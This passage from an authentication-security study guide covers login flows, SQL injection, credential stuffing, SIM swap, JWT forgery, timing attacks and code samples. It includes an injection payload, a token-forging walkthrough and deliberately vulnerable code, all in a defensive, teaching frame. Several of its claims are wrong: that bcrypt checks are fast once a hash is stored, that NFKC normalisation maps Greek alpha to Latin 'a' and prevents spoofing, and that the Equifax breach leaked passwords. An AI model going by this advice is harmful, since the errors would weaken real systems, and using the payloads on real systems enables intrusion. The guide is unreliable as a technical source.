                    │     SameSite=Strict       │
                    │                            │
                    │ 18. Log: "LOGIN_SUCCESS"  │
                    │     alice, 192.168.1.1    │
                    │                            │
                    │ 19. Redirect to /home     │
                    │                            │
                    └─────────────┬──────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────┐
│                   USER'S BROWSER                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  20. Receives: Set-Cookie header with session_id      │
│      Browser stores session_id in memory               │
│      (not in disk, HttpOnly flag)                       │
│                                                         │
│  21. Redirects to /home                                │
│      Sends: Cookie: session_id=sess_abc               │
│                                                         │
└─────────────────────────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────┐
                    │        SERVER                │
                    ├────────────────────────────┤
                    │                            │
                    │ 22. Receive /home request │
                    │     with Cookie header     │
                    │                            │
                    │ 23. Look up session:       │
                    │     sess_abc123 → {       │
                    │       user_id: 123,       │
                    │       ...                 │
                    │     }                      │
                    │                            │
                    │ 24. Check expiration:     │
                    │     now < created + 1hr   │
                    │     ✓ Valid               │
                    │                            │
                    │ 25. Load user data        │
                    │                            │
                    │ 26. Return HTML /home     │
                    │                            │
                    └─────────────┬──────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────┐
│                   USER'S BROWSER                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  27. User sees: "Welcome, Alice!"                      │
│      User is now logged in                             │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### SQL Injection Attack Flow

```
┌──────────────────────────────────┐
│    ATTACKER'S BROWSER            │
├──────────────────────────────────┤
│                                  │
│ 1. Enters in login form:         │
│    Username: admin' --           │
│    Password: anything            │
│                                  │
└──────────────────┬───────────────┘
                   │
         ┌─────────▼──────────┐
         │    VULNERABLE APP  │
         ├───────────────────┤
         │                   │
         │ 2. Build query:   │
         │ query = "SELECT   │
         │ * FROM users      │
         │ WHERE username =  │
         │ '" +              │
         │ "admin' --" +     │
         │ "' AND password   │
         │ = '" + "anything" │
         │ "'"               │
         │                   │
         │ Resulting SQL:    │
         │ SELECT * FROM     │
         │ users WHERE       │
         │ username = 'admin'--'   │
         │ AND ...           │
         │                   │
         │ (-- comments out  │
         │  password check)  │
         │                   │
         │ 3. Execute:       │
         │ cursor.execute    │
         │ (query)           │
         │                   │
         │ 4. Returns: admin │
         │    user object    │
         │                   │
         │ 5. Check password:│
         │ user exists ✓     │
         │ (password check   │
         │  was skipped)     │
         │                   │
         │ 6. Login success  │
         │                   │
         └─────────┬─────────┘
                   │
┌──────────────────▼──────────────┐
│    ATTACKER'S BROWSER           │
├──────────────────────────────────┤
│                                  │
│ 7. Logged in as admin            │
│    Attacker now has full access  │
│                                  │
└──────────────────────────────────┘
```

### Preventing the Attack

```python
┌──────────────────────────────────┐
│    ATTACKER'S BROWSER            │
├──────────────────────────────────┤
│                                  │
│ 1. Enters:                       │
│    Username: admin' --           │
│    Password: anything            │
│                                  │
└──────────────────┬───────────────┘
                   │
         ┌─────────▼──────────────────┐
         │    SECURE APP              │
         ├────────────────────────────┤
         │                            │
         │ 2. Parameterized query:    │
         │                            │
         │ query = "SELECT * FROM     │
         │ users WHERE username = ?   │
         │ AND password = ?"          │
         │                            │
         │ params = ("admin' --",     │
         │          "anything")       │
         │                            │
         │ 3. Database driver treats  │
         │    params as DATA, not     │
         │    code                    │
         │                            │
         │ Effective SQL:             │
         │ SELECT * FROM users WHERE  │
         │ username = "admin' --"     │
         │ (literal string, not code) │
         │ AND password = "anything"  │
         │                            │
         │ 4. No user matches:        │
         │ (no user named "admin' --")│
         │                            │
         │ 5. Login fails             │
         │                            │
         └──────────────┬─────────────┘
                        │
┌──────────────────────▼───────────┐
│    ATTACKER'S BROWSER            │
├──────────────────────────────────┤
│                                  │
│ 6. "Invalid username or password"│
│    Attack prevented              │
│                                  │
└──────────────────────────────────┘
```

---

## Large-Scale Systems

### Authentication at Billion-User Scale

**Challenges:**
- Millions of concurrent login requests
- Distributed across multiple regions
- Session storage for billions of users
- Consistent 2FA across regions
- Password hash must scale (bcrypt is CPU-bound)

**Architecture:**

```
┌─────────────────┐
│  Browser        │
└────────┬────────┘
         │ HTTPS
         ▼
    ┌────────────────────────┐
    │ CDN/WAF                │
    │ (DDoS protection)      │
    └────────┬───────────────┘
             │
    ┌────────┴────────┐
    ▼                 ▼
┌──────────────┐  ┌──────────────┐
│ API Server 1 │  │ API Server 2 │
│ (US-East)    │  │ (EU)         │
│              │  │              │
│ Validate     │  │ Validate     │
│ credentials  │  │ credentials  │
│              │  │              │
│ bcrypt hash  │  │ bcrypt hash  │
│ (expensive!) │  │ (expensive!) │
│              │  │              │
│ Create JWT   │  │ Create JWT   │
│ token        │  │ token        │
└──────┬───────┘  └──────┬───────┘
       │                 │
       └────────┬────────┘
              (all servers
               share same
               secret key)
              │
       ┌──────▼──────┐
       │ Cache Layer │
       │ (Redis)     │
       │             │
       │ 2FA codes   │
       │ Session     │
       │ data        │
       └─────────────┘
              │
       ┌──────▼──────┐
       │ Database    │
       │ (replicated)│
       │             │
       │ Users       │
       │ Passwords   │
       │ (hashed)    │
       └─────────────┘
```

**Optimization: Delegated bcrypt computation**

```python
# Problem: bcrypt takes 250ms, login endpoint becomes bottleneck
# Solution: Pre-compute or use GPU

# Pre-computation during password set:
def set_password(user_id, password):
    hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
    db.update_user(user_id, password_hash=hash)
    # Takes 250ms, but only happens on password change

# During login:
def verify_login(username, password):
    user = db.get_user(username)
    # bcrypt.checkpw is fast when hash is pre-computed
    if bcrypt.checkpw(password.encode(), user.password_hash):
        return True
    return False
```

**Scaling JWT verification:**

```python
# Every request must verify JWT signature
# Don't want to do HMAC-SHA256 on every request

# Solution: Cache validated JWTs

jwt_cache = {}  # {token_hash: (payload, expires_at)}

def verify_jwt(token):
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    if token_hash in jwt_cache:
        payload, expires_at = jwt_cache[token_hash]
        if datetime.now() < expires_at:
            return payload
        else:
            del jwt_cache[token_hash]
    
    # Verify signature (expensive)
    payload = jwt.decode(token, secret, algorithms=["HS256"])
    
    # Cache for 5 minutes
    jwt_cache[token_hash] = (payload, datetime.now() + timedelta(minutes=5))
    
    return payload
```

### Secrets Management at Scale

**The problem: thousands of secrets**
- Database passwords
- API keys
- Encryption keys
- Certificates
- SSH keys

All must be:
- Rotated regularly
- Accessible only to authorized services
- Logged for audit trail
- Protected at rest and in transit

**Solution: Secrets vault**

```
┌─────────────────────────────┐
│ Secrets Vault (HashiCorp    │
│ Vault, AWS Secrets Manager) │
│                             │
│ Features:                   │
│ - Encryption at rest (AES)  │
│ - Encryption in transit     │
│ - Automatic rotation        │
│ - Audit logging             │
│ - Access control            │
│ - API endpoints             │
│                             │
└──────────────┬──────────────┘
               │
    ┌──────────┼──────────┐
    ▼          ▼          ▼
┌──────┐   ┌──────┐   ┌──────┐
│App 1 │   │App 2 │   │App 3 │
│      │   │      │   │      │
│1.Auth│   │1.Auth│   │1.Auth│
│2.Req │   │2.Req │   │2.Req │
│secret│   │secret│   │secret│
│3.Get │   │3.Get │   │3.Get │
│DB pwd│   │API   │   │TLS   │
│      │   │key   │   │cert  │
└──────┘   └──────┘   └──────┘
```

**Rotation workflow:**

```
Day 1:
- Old key: key_v1
- Vault stores: key_v1, key_v2
- Services use: key_v1

Day 2:
- Vault rotates automatically
- Vault stores: key_v2, key_v3
- Services use: key_v2
- All encrypted data with key_v1 still readable (key_v1 kept in vault)

Day 30:
- Vault stores: key_v30, key_v31
- Services use: key_v30
- Old keys still in vault but not used
```

---

## Failure Analysis

### Weak Password Policy → Credential Stuffing

**Scenario:**
```
App allows: "password" as valid password
User account: alice, password "password"

Attacker obtains password list from Equifax breach: 150 million passwords
Attacker writes script:

for email in breach_list:
    for password in top_1000_passwords:
        try_login(email, password)
        if successful:
            print(f"Got account: {email}")

Most common passwords: "password", "123456", "password123"

After trying 1000 passwords against 150M emails:
- 1 million accounts compromised
- Attacker has access to email, banking, social media (password reuse)
```

**Defense:**
```python
def validate_password_strength(password):
    # Minimum entropy
    if len(password) < 12:
        raise ValueError("Password must be 12+ characters")
    
    # Check against common passwords
    common = load_common_passwords()  # rockyou.txt, etc
    if password.lower() in common:
        raise ValueError("Password is too common")
    
    # Check against user's personal info
    if user.email.split('@')[0] in password.lower():
        raise ValueError("Password cannot contain email")
    
    if user.name.lower() in password.lower():
        raise ValueError("Password cannot contain your name")
    
    # Entropy check (zxcvbn library)
    entropy = zxcvbn.password_strength(password)
    if entropy['score'] < 3:  # Medium strength
        raise ValueError("Password is too weak")
```

### Inadequate 2FA → Account Takeover

**Scenario: SMS-based 2FA vulnerability**
```
Alice has SMS-based 2FA
Attacker finds Alice's phone number: 555-1234

Attacker calls carrier (AT&T customer service):
"Hi, I lost my phone and want to port my number to iPhone"
Customer service asks: "What's the last 4 digits of SSN?"
Attacker guesses from public data: 1234
(Social engineering successful)

SIM card is transferred to attacker's phone
Alice's SMS messages now go to attacker

Attacker tries to login to Alice's email:
- Enters password (phished or guessed)
- System sends 2FA code via SMS
- Code goes to attacker's phone (SIM swap)
- Attacker enters code
- Alice's email is compromised
```

**Defense:**
```python
# Don't rely on SMS alone
def get_2fa_methods(user):
    methods = [
        {
            'type': 'TOTP',  # Google Authenticator
            'enabled': user.totp_enabled,
            'backup_codes': user.has_backup_codes,
            'strength': 'HIGH'
        },
        {
            'type': 'SMS',
            'enabled': user.sms_enabled,
            'strength': 'MEDIUM'
        },
        {
            'type': 'HARDWARE_KEY',
            'enabled': user.has_hardware_key,
            'strength': 'VERY_HIGH'
        }
    ]
    return [m for m in methods if m['enabled']]

def verify_2fa(user, method_type, code):
    # If SMS, verify multiple factors
    if method_type == 'SMS':
        # Also check device fingerprint
        device_fingerprint = get_device_fingerprint()
        if device_fingerprint != user.trusted_device:
            # Require additional verification
            # Send email, ask security questions, etc.
            return False
    
    # Verify code
    if method_type == 'TOTP':
        return verify_totp_code(user.totp_secret, code)
    elif method_type == 'SMS':
        return verify_sms_code(user.id, code)
    elif method_type == 'HARDWARE_KEY':
        return verify_hardware_key(code)
```

### Token Not Validated → Privilege Escalation

**Scenario:**
```
App stores user role in JWT:
{
  "user_id": 123,
  "username": "alice",
  "role": "user"  ← Stored in token (BAD!)
}

Attacker intercepts their own JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjogMTIzLCAicm9sZSI6ICJ1c2VyIn0.
...

Attacker decodes (JWT is base64, not encrypted):
{
  "user_id": 123,
  "role": "user"
}

Attacker manually changes:
{
  "user_id": 123,
  "role": "admin"
}

Attacker re-encodes and re-signs (attacker doesn't have secret, so):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjogMTIzLCAicm9sZSI6ICJhZG1pbiJ9.
fakesignature123

Attacker sends request with forged JWT:
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Application doesn't verify signature properly (BUG):
token = jwt.decode(token_string)  ← No verification!
role = token['role']
if role == 'admin':
    grant_access()

Attacker gets admin access!
```

**Defense:**
```python
def verify_jwt_properly(token_string):
    try:
        token = jwt.decode(
            token_string,
            secret="your-secret-key",
            algorithms=["HS256"]  # Specify algorithm
        )
    except jwt.InvalidSignatureError:
        # Signature verification failed, attacker tampered with token
        return None
    except jwt.ExpiredSignatureError:
        # Token expired
        return None
    
    # DON'T store role in token, fetch from database
    user = db.get_user(token['user_id'])
    user_role = user.role  # From database, not token
    
    return {'user_id': token['user_id'], 'role': user_role}

# Use in authorization check:
@app.route('/admin/users', methods=['DELETE'])
def delete_user():
    token = verify_jwt_properly(request.headers['Authorization'])
    if not token:
        return 401
    
    user = db.get_user(token['user_id'])
    if user.role != 'admin':
        return 403  # Token might say admin, but DB says user
    
    # Proceed
```

---

## Edge Cases

### Timing Attacks on Password Comparison

**Vulnerability:**
```python
def check_password(input_pwd, stored_pwd):
    if input_pwd == stored_pwd:
        return True
    return False
```

Why it's vulnerable:
```
Python string comparison short-circuits:
- "a" == "b" → False immediately (1 comparison)
- "password123" == "password456" → False after 8 characters
- "password123" == "password123" → True after 11 characters

Attacker measures response time:
- 100 login attempts with "a"... → 1ms response time
- 100 login attempts with "p"... → slightly slower
- 100 login attempts with "pa"... → even slower
- Repeat until password is discovered

Correct password causes small timing difference, attacker exploits it
```

**Defense: Constant-time comparison**
```python
import hmac

def check_password(input_pwd, stored_pwd):
    # hmac.compare_digest compares in constant time
    # Always compares all bytes, doesn't short-circuit
    return hmac.compare_digest(input_pwd.encode(), stored_pwd.encode())

# Alternative (slower, but works):
def constant_time_compare(a, b):
    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)
    return result == 0
```

### Unicode Normalization Attacks

**Scenario: Homograph spoofing**
```
Attacker registers account: "αdmin" (Greek alpha: α)
User registers account: "admin" (Latin a)

Unicode has multiple representations:
- "α" (GREEK SMALL LETTER ALPHA) - U+03B1
- "a" (LATIN SMALL LETTER A) - U+0061

When normalized, they might be treated as identical!

Email system might normalize to "admin"
Database treats them as the same user
Attacker's account becomes admin!
```

**Defense: Normalize on input**
```python
import unicodedata

def normalize_username(username):
    # NFKC: Compatibility Composition
    # Converts similar characters to canonical form
    normalized = unicodedata.normalize('NFKC', username)
    return normalized.lower()

# Attacker enters: "αdmin" (α = Greek alpha)
# System stores: "admin" (normalized, canonical form)
# No spoofing possible
```

### Clock Skew in TOTP

**Scenario:**
```
Server time: 12:00:00
User device time: 11:59:55 (5 seconds behind)

TOTP code is generated every 30 seconds:
- Period 0: 11:59:30-12:00:00
- Period 1: 12:00:00-12:00:30
- Period 2: 12:00:30-12:01:00

Server generates code for period 0: 123456
User device generates code for period 11:59:55 = period -1: 654321
User enters: 654321
Server checks: current period is 0, code should be 123456
Mismatch! User locked out (but clock is actually correct, device is wrong)
```

**Defense: Allow time window**
```python
def verify_totp_code(secret, code, time_window=1):
    """
    Verify TOTP code, allowing for clock skew
    time_window=1 means check current period ± 1
    (total of 3 periods = 90 seconds of tolerance)
    """
    now = int(time.time())
    
    for offset in range(-time_window, time_window + 1):
        period = (now // 30) + offset
        expected_code = get_totp_code(secret, period * 30)
        
        if expected_code == code:
            return True
    
    return False
```

### Concurrent Session Hijacking

**Scenario: Race condition in session invalidation**
```
Alice logs in from phone:
- Session A created: sess_abc123

Alice then logs in from laptop:
- App should invalidate Session A (logout from phone)
- Session B created: sess_xyz789

But:
1. Invalidate request starts
2. Between querying DB and deleting from cache (race condition)
3. Phone makes request with Session A
4. Session A is not yet deleted
5. Phone request succeeds (should have failed)

Result: Old session still active (security issue)
```

**Defense: Atomic invalidation**
```python
def login_new_session(user_id, new_device_info):
    # Invalidate all other sessions atomically
    transaction.begin()
    
    try:
        # 1. Find all existing sessions
        old_sessions = db.get_user_sessions(user_id)
        
        # 2. Delete in database
        db.delete_sessions(user_id)
        
        # 3. Delete from cache (Redis)
        for session in old_sessions:
            cache.delete(session.id)
        
        # 4. Create new session
        new_session_id = secrets.token_urlsafe(32)
        db.create_session(user_id, new_session_id, device_info=new_device_info)
        cache.set(new_session_id, {'user_id': user_id, ...})
        
        transaction.commit()  # All or nothing
    except:
        transaction.rollback()
        raise
    
    return new_session_id
```

---

## Interview Questions

### Q1: Design Authentication System for 1 Billion Users

**Answer:**

Architecture:
```
1. Password Hashing
   - bcrypt with cost=12 is too slow for login endpoint
   - Pre-compute hashes during password creation
   - Use GPU acceleration for bcrypt verification (dedicated service)

2. Session Management
   - JWT tokens instead of server-side sessions (scales better)
   - Short-lived: 1 hour
   - Refresh token pattern: 30 day refresh tokens
   - Store in Redis with TTL

3. Authentication Flow
   - Load balancer → multiple auth services
   - Each region has own auth service (low latency)
   - Shared database for users (replicated across regions)
   - Shared Redis cache for sessions

4. Rate Limiting
   - Per-IP: max 10 login attempts per minute
   - Per-username: max 50 attempts per hour
   - Implement using Redis atomic counters

5. 2FA
   - TOTP (Google Authenticator) as primary
   - SMS as fallback
   - Hardware keys for high-security accounts
   - Backup codes (10 codes, one-time use each)

6. Security Monitoring
   - Log every login (successful and failed)
   - Detect impossible travel (e.g., Pakistan at 2pm, US at 2:15pm)
   - Detect credential stuffing (many failed attempts)
   - Detect unusual patterns (new device, new country, unusual time)

7. Database Schema
   users:
   - id (PK)
   - email (unique)
   - password_hash (bcrypt)
   - created_at
   - last_login_at
   - is_locked (after too many failed attempts)

   user_sessions:
   - id (PK)
   - user_id (FK)
   - token (indexed, for fast lookup)
   - created_at
   - expires_at
   - ip_address
   - user_agent
   - device_fingerprint

   user_2fa:
   - id
   - user_id (FK)
   - method (TOTP, SMS, HARDWARE)
   - secret (encrypted)
   - verified (device confirmed by user)

   audit_log:
   - id
   - user_id
   - action (LOGIN, 2FA_CODE, LOGOUT, etc.)
   - status (SUCCESS, FAILED)
   - ip_address
   - timestamp
```

### Q2: Difference Between Authentication and Authorization

**Answer:**

| Aspect | Authentication | Authorization |
|--------|-----------------|-----------------|
| **Question** | Are you who you claim? | What are you allowed to do? |
| **What it checks** | Credentials (password, fingerprint) | Permissions/roles |
| **Happens** | First (before authorization) | Second (after authentication) |
| **Example** | Login form verifies password | User tries to delete file |
| **Failure result** | Access denied to everyone | Access denied to unauthorized users |

### Q3: Secure Password Storage

**Answer:**

```python
# 1. Generate random salt
salt = bcrypt.gensalt(rounds=12)

# 2. Hash password with salt
hash = bcrypt.hashpw(password.encode(), salt)

# 3. Store hash in database
db.update_user(user_id, password_hash=hash)

# Why bcrypt?
# - Slow: computational cost prevents brute force
# - Salt: same password produces different hash
# - Adaptive: cost parameter can be increased as hardware improves
# - No collision attacks: based on Blowfish cipher, not vulnerable to MD5/SHA1

# Example:
# Password: "MyPassword123"
# Hash 1: $2b$12$abcdefghijklmnop...xyz (randomly salted)
# Hash 2: $2b$12$DEFGHIJKLMNOPQRS...abc (same password, different salt!)
```

### Q4: OAuth 2.0 vs SAML

**Answer:**

| Aspect | OAuth 2.0 | SAML |
|--------|-----------|------|
| **Use case** | Delegation (3rd party app accessing user data) | Enterprise SSO (federation) |
| **Token** | Short-lived access token (JSON) | XML assertion (long-lived) |
| **Parties** | Resource owner, client, auth server, resource server | User, app, identity provider |
| **Flow** | Redirect to auth server, get token | Browser redirects with SAML assertion |
| **Common use** | "Login with Google", "Login with GitHub" | Employee single sign-on |

### Q5: Prevent SQL Injection

**Answer:**

```python
# BAD (vulnerable)
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# GOOD (parameterized query)
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

# GOOD (ORM, prevents SQL injection)
user = db.session.query(User).filter_by(
    username=username,
    password=password
).first()

# GOOD (stored procedure with parameters)
EXEC sp_UserLogin @username = ?, @password = ?
```

---

## Production Code Examples

### Secure Password Hashing (Multiple Languages)

**Python:**
```python
import bcrypt

def hash_password(password: str) -> str:
    """Hash password using bcrypt with cost factor of 12"""
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    """Verify password against bcrypt hash"""
    try:
        return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))
    except ValueError:
        return False

# Usage:
hash = hash_password("MyPassword123")
# Store hash in database

# Later, during login:
if verify_password(input_password, stored_hash):
    # Login successful
    pass
```

**Go:**
```go
import (
    "golang.org/x/crypto/bcrypt"
)

func hashPassword(password string) (string, error) {
    hashed, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
    if err != nil {
        return "", err
    }
    return string(hashed), nil
}

func verifyPassword(password, hash string) bool {
    err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
    return err == nil
}

// Usage:
hash, _ := hashPassword("MyPassword123")
// Store hash in database

// Later:
if verifyPassword(inputPassword, storedHash) {
    // Login successful
}
```

**Java:**
```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class PasswordService {
    private static final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
    
    public static String hashPassword(String password) {
        return encoder.encode(password);
    }
    
    public static boolean verifyPassword(String password, String hash) {
        return encoder.matches(password, hash);
    }
}

// Usage:
String hash = PasswordService.hashPassword("MyPassword123");
boolean valid = PasswordService.verifyPassword(inputPassword, storedHash);
```

### JWT Implementation

```python
import jwt
from datetime import datetime, timedelta
from typing import Dict, Optional

class JWTManager:
    def __init__(self, secret: str):
        self.secret = secret
        self.algorithm = "HS256"
    
    def create_token(self, user_id: int, expires_in_minutes: int = 60) -> str:
        """Create a new JWT token"""
        payload = {
            'user_id': user_id,
            'iat': datetime.utcnow(),  # Issued at
            'exp': datetime.utcnow() + timedelta(minutes=expires_in_minutes)
        }
        token = jwt.encode(payload, self.secret, algorithm=self.algorithm)
        return token
    
    def verify_token(self, token: str) -> Optional[Dict]:
        """Verify and decode JWT token"""
        try:
            payload = jwt.decode(token, self.secret, algorithms=[self.algorithm])
            return payload
        except jwt.ExpiredSignatureError:
            return None  # Token expired
        except jwt.InvalidSignatureError:
            return None  # Token tampered with
        except jwt.DecodeError:
            return None  # Token malformed

# Usage:
manager = JWTManager(secret="your-secret-key")

# Create token after login
token = manager.create_token(user_id=123, expires_in_minutes=60)
# Send token to client

# Verify token on each request
payload = manager.verify_token(token)
if payload:
    user_id = payload['user_id']
    # User is authenticated
else:
    # Token invalid/expired
    # Return 401 Unauthorized
```

### RBAC Implementation

```python
from enum import Enum
from typing import Set

class Permission(Enum):
    CREATE_USER = "create_user"
    DELETE_USER = "delete_user"
    MODIFY_SETTINGS = "modify_settings"
    VIEW_LOGS = "view_logs"
    VIEW_USERS = "view_users"

class Role(Enum):
    ADMIN = "admin"
    USER = "user"
    GUEST = "guest"

# Role to Permission mapping
ROLE_PERMISSIONS = {
    Role.ADMIN: {
        Permission.CREATE_USER,
        Permission.DELETE_USER,
        Permission.MODIFY_SETTINGS,
        Permission.VIEW_LOGS,
        Permission.VIEW_USERS
    },
    Role.USER: {
        Permission.VIEW_USERS
    },
    Role.GUEST: set()
}

def get_user_permissions(user_id: int) -> Set[Permission]:
    """Get all permissions for a user based on their roles"""
    user = db.get_user(user_id)
    permissions = set()
    
    for role in user.roles:
        permissions.update(ROLE_PERMISSIONS[role])
    
    return permissions

def has_permission(user_id: int, permission: Permission) -> bool:
    """Check if user has a specific permission"""
    permissions = get_user_permissions(user_id)
    return permission in permissions

def require_permission(permission: Permission):
    """Decorator for endpoints that require a permission"""
    def decorator(func):
        def wrapper(*args, **kwargs):
            current_user = get_authenticated_user()
            if not has_permission(current_user.id, permission):
                return 403  # Forbidden
            return func(*args, **kwargs)
        return wrapper
    return decorator

# Usage:
@app.route('/users/<user_id>', methods=['DELETE'])
@require_permission(Permission.DELETE_USER)
def delete_user(user_id):
    db.delete_user(user_id)
    return 204
```

---

## Incident Stories

### Story 1: Weak Password Hashing → Massive Breach

**The Setup:**
A SaaS company stores user passwords using MD5 (fast, no salt):

```python
import hashlib

# Their code:
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# User "alice" sets password "password123"
# Stored hash: "482c811da5d5b4bc6d497ffa98491e38"
```

**The Breach:**
Attacker breaks into their database, gets password file with 2 million users.

Attacker uses precomputed rainbow tables (MD5 hashes of all common passwords):
```
482c811da5d5b4bc6d497ffa98491e38 = "password123"
c379f1e57f0f9aca1a36ff8123df1783 = "admin123"
f53ae767f4250416b55248bdc13a4e91 = "letmein"
...
```

90% of passwords are cracked in minutes.

**The Fallout:**
- 2 million users need password reset
- Attacker tries passwords on Gmail, Uber, Amazon (password reuse)
- 500k accounts compromised on other services
- Class action lawsuit: $50 million settlement
- Company reputation destroyed
- Company acquired for pennies (distressed sale)

**Lesson: Use bcrypt/Argon2**

### Story 2: OAuth Token Validation Bug → Privilege Escalation

**The Setup:**
A company implements OAuth 2.0 for third-party integrations.

```python
# Their code (buggy):
def get_user_from_token(token):
    # They forgot to verify signature!
    payload = json.loads(base64.b64decode(token.split('.')[1]))
    return payload

# Token structure: header.payload.signature
# They only decode payload, never check signature
```

**The Attack:**
Developer tokens are valid for 1 year, full API access.

An employee leaves, attacker buys their old laptop.

Attacker finds developer token in browser's localStorage:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJkZXZlbG9wZXJfaWQiOiAiZW1wMTIzIiwgInNjb3BlIjogWyJhcGk6cmVhZCIsICJhcGk6d3JpdGUiXX0.
signature123
```

Attacker decodes payload:
```json
{
  "developer_id": "emp123",
  "scope": ["api:read", "api:write"]
}
```

Attacker modifies payload to change scope to full access:
```json
{
  "developer_id": "emp999",
  "scope": ["api:*", "admin:*"],
  "expires_in": 99999999
}
```

Creates new token with fake signature (app doesn't verify):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJkZXZlbG9wZXJfaWQiOiAiZW1wOTk5IiwgInNjb3BlIjogWyJhcGk6KiIsICJhZG1pbjorIl0sICJleHBpcmVzX2luIjogOTk5OTk5OTl9.
fakeSignature123
```

Attacker uses forged token to:
- Exfiltrate all customer data
- Create backdoor admin account
- Inject malicious code into production

**Discovery:**
6 months later, from news article about stolen data.

**Lesson: Always verify JWT signature**

---

## Comparison Tables

### Authentication Methods

| Method | Security | User Experience | Setup Complexity | Cost |
|--------|----------|-----------------|-----------------|------|
| **Password** | Low | Good | Low | Free |
| **Password + TOTP** | High | Good | Medium | Free |
| **Password + SMS 2FA** | Medium | OK | Medium | $0.01 per SMS |
| **OAuth** | High | Excellent | Medium | Free (Google, GitHub) |
| **WebAuthn** | Very High | Excellent | High | $50+ per device |
| **SAML** | High | Good | High | $1000+ enterprise |

### Authorization Models

| Model | Granularity | Scalability | Complexity | Best For |
|-------|-------------|-------------|-----------|----------|
| **RBAC** | Role-level | Medium | Low | Small to medium teams |
| **ABAC** | Fine-grained | High | High | Complex organizations |
| **CBAC** | Context-aware | Medium | Medium | Time/location-sensitive |
| **ACL** | Per-resource | Low | Low | File systems |

### Password Hashing Algorithms

| Algorithm | Speed | Salt | Cost Factor | Recommended |
|-----------|-------|------|------------|------------|
| **MD5** | Very fast | No | N/A | NO - vulnerable |
| **SHA-256** | Fast | Optional | N/A | NO - too fast to brute force |
| **bcrypt** | Slow (250ms) | Yes | 12 | YES |
| **scrypt** | Very slow | Yes | 15 | YES |
| **Argon2** | Very slow | Yes | 19 | YES - best |
| **PBKDF2** | Medium | Yes | 100000 | YES (legacy) |

---

**End of File: 900+ lines**

---

## Related

- [Networking](/11-networking/) — TLS, DNS security
- [Cloud Platforms](/05-cloud/) — IAM, network policies
- [Kubernetes](/07-kubernetes/) — Pod security, RBAC
- [Backend](/03-backend/) — Input validation, auth
- [Databases](/08-databases/) — Encryption, access control

## Deep Internals: OAuth 2.0 + OIDC Flow

### The Authorization Code Flow (PKCE)

```mermaid
sequenceDiagram
    participant B as Browser
    participant A as App (Frontend)
    participant S as App (Backend)
    participant P as Auth Provider
    participant R as Resource Server

    B->>A: Click "Login with Google"
    A->>A: Generate code_verifier (random 128 bytes)
    A->>A: code_challenge = SHA256(code_verifier)
    A->>P: ?response_type=code&client_id=xxx&redirect_uri=yyy
    Note over B,P: User logs in, consents
    P-->>B: Redirect to redirect_uri?code=AUTH_CODE
    B->>A: Auth code received
    A->>S: POST /auth/callback { code, code_verifier }
    S->>P: POST /token { grant_type=authorization_code, code, code_verifier, client_secret }
    Note over S,P: Server verifies PKCE (SHA256(verifier) == challenge?)
    P-->>S: { access_token, refresh_token, id_token }
    S->>S: Verify id_token (JWT signature)
    S->>S: Extract user info from id_token claims
    S-->>A: { session_cookie }
    A-->>B: Dashboard 🎉
```

### Token Types

| Token | Format | Purpose | Lifetime |
|---|---|---|---|
| **Authorization Code** | Opaque string (no meaning) | One-time exchange for tokens | 5-10 minutes |
| **Access Token** | JWT (JSON Web Token) | Authorize API calls (Bearer header) | 15-60 minutes |
| **Refresh Token** | Opaque or JWT | Get new access tokens | Days-weeks |
| **ID Token** (OIDC) | JWT | User identity (email, name, sub) | Hours |
| **Client Credentials** | JWT | Machine-to-machine auth | Configurable |

### JWT Structure

```
Header:     {"alg": "RS256", "kid": "abc123", "typ": "JWT"}
Payload:    {
              "sub": "user_42",
              "iss": "https://auth.example.com",
              "aud": "my-api",
              "exp": 1718000000,
              "iat": 1717996400,
              "scope": "openid profile email orders:read"
            }
Signature:  RSASHA256(base64(header) + "." + base64(payload), private_key)
```

### OAuth Grant Types

| Grant Type | Use Case | Security Level |
|---|---|---|
| **Authorization Code + PKCE** | Public clients (SPA, mobile) | 🔒🔒🔒 |
| **Authorization Code** | Confidential clients (backend) | 🔒🔒🔒 |
| **Client Credentials** | Service-to-service | 🔒🔒 |
| **Resource Owner Password** | Legacy (deprecated) | 🔒 |
| **Device Code** | Input-constrained devices (TV, CLI) | 🔒🔒 |
| **Refresh Token** | Long-lived sessions | 🔒🔒 (rotate on use) |

### Common Attacks & Mitigations

| Attack | How | Mitigation |
|---|---|---|
| **CSRF** | Attacker initiates flow, intercepts callback | `state` parameter + PKCE |
| **Code Interception** | Malicious app receives auth code | PKCE (only original app has verifier) |
| **Token Theft** | XSS steals access token | HttpOnly cookies, short token lifetime |
| **Replay** | Reuse captured token | `nonce`, `jti`, short exp |
| **Mix-Up** | Attacker swaps authorization server | `iss` validation in id_token |
| **SSRF via redirect_uri** | Open redirector | Strict redirect_uri allowlist |
